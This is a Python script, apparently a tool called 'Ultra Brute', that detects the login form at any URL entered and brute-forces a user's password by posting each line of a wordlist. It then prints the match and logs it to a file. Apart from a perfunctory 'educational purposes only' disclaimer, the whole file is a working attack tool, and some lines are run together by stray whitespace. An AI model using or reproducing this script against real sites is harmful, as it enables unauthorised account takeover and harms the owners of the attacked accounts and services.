from bs4 import BeautifulSoup                                    import requests
import re
import time
from colorama import init, Fore, Style

# Initialize colorama
init()

def find_form_elements_and_check_login(soup):
    form_elements = {}

    # Selectors to find username, password, and login button fields
    username_field = soup.select_one('input[type="text"], input[name="username"]')
    password_field = soup.select_one('input[type="password"], input[name="password"]')
    login_button = soup.select_one('input[type="submit"], button[type="submit"]')

    # Check if any of the elements were found
    if username_field:
        form_elements['username'] = username_field.get('name') or username_field.get('id')
    if password_field:                                                   form_elements['password'] = password_field.get('name') or password_field.get('id')
    if login_button:
        form_elements['login_button'] = login_button.get('name') or login_button.get('id')                                        
    # Check if all required form elements are found
    if all(field in form_elements for field in ['username', 'password', 'login_button']):
        return form_elements, True
    else:
        return form_elements, False

# Function to print developer logo and disclaimer
def print_developer_logo():
    logo = """
 _   _ _ _               ____             _
| | | | | |_ _ __ __ _  | __ ) _ __ _   _| |_ ___
| | | | | __| '__/ _` | |  _ \| '__| | | | __/ _ \\
| |_| | | |_| | | (_| | | |_) | |  | |_| | ||  __/
 \___/|_|\__|_|  \__,_| |____/|_|   \__,_|\__\___|
    """
    disclaimer = """
    _______________________________________________

    This script is intended for educational purposes only.
    The developer assumes no responsibility for any misuse or damage caused.
    Use it responsibly and with proper authorization.
    ______________________________________________
    """
    print(Fore.GREEN + logo)
    print("_______________________\n")
    print("Telegram: @Algerianultra")
    print("Facebook: https://facebook.com/Algerian.ultra")
    print("Github: https://github.com/Algerianultra")
    print("_______________________")
    print(Fore.RED + disclaimer)

# Function to run password guessing with delay
def run_password_guessing(target_url, username, password_list_path, error_messages_file):
    try:
        # Print developer logo and disclaimer
        print_developer_logo()

        # Validate the target URL
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            raise ValueError(Fore.RED + "Invalid URL format. Please provide a valid URL starting with 'http://' or 'https://'.")

        # Load error messages from file
        error_messages = load_error_messages(error_messages_file)

        # Make initial GET request to fetch the page and analyze its structure
        response = requests.get(target_url)

        # Check if response status code is OK
        if response.status_code != 200:
            raise Exception(Fore.RED + f"Failed to fetch the page. Status Code: {response.status_code}")

        soup = BeautifulSoup(response.content, 'html.parser')

        # Find form elements dynamically and check if login elements are present
        form_elements, login_elements_present = find_form_elements_and_check_login(soup)

        if not login_elements_present:
            print(Fore.RED + "[+] This URL does not appear to be a login page. Unable to locate necessary form elements.")
            return

        # Start password brute force attack
        print(Fore.GREEN + f"[+] Attack starting with URL: {target_url}")
        print("_______________________")

        # Prepare the data dictionary with initial values
        data_dictionary = {
            form_elements['username']: username,
            form_elements['password']: '',
            form_elements['login_button']: 'submit'
        }

        # Open the password list file
        with open(password_list_path, "r") as wordlist_file:
            print(Fore.GREEN + "[+] Starting password Brute")

            # Iterate through each password in the file
            for line in wordlist_file:
                password = line.strip()
                data_dictionary[form_elements['password']] = password

                # Make the POST request
                response = requests.post(target_url, data=data_dictionary)

                # Check if login was successful
                if not check_login_failure(response.content.decode(), error_messages):
                    print(Fore.GREEN + f"[+] Correct password found: {password}")
                    print("_______________________")
                    print(Fore.GREEN + f"Attack finish\nResult: username: {username}\n         password: {password}")
                    print("_______________________")

                    # Save result to log file
                    with open('log.txt', 'a') as log_file:
                        log_file.write(f"Target URL: {target_url}\nUsername: {username}\nPassword: {password}\n\n")

                    return
                else:
                    print(Fore.RED + f"[+] Incorrect password: {password}")
                    time.sleep(1)  # Add a delay between attempts for politeness

            # If all passwords failed
            print(Fore.RED + "[+] All passwords failed. The correct password was not found.")
            print("_______________________")

    except ValueError as ve:
        print(Fore.RED + str(ve))
    except requests.exceptions.RequestException as re:
        print(Fore.RED + f"Failed to connect to the target URL: {str(re)}")
    except Exception as e:
        print(Fore.RED + str(e))

# Function to load error messages from a file
def load_error_messages(file_path):
    with open(file_path, "r") as f:
        error_messages = [line.strip() for line in f.readlines() if line.strip()]
    return error_messages

# Function to check if any of the error messages are in the response
def check_login_failure(response_text, error_messages):
    for message in error_messages:
        if message in response_text:
            return True
    return False

# Print developer logo before starting password guessing
print_developer_logo()

# Input URLs and credentials
target_url = input(Fore.YELLOW + "Input URL: ").strip()
username = input("Input username: ").strip()
password_list_path = input("Input password list: ").strip()
error_messages_file = "error_messages.txt"

# Run password guessing
run_password_guessing(target_url, username, password_list_path, error_messages_file) 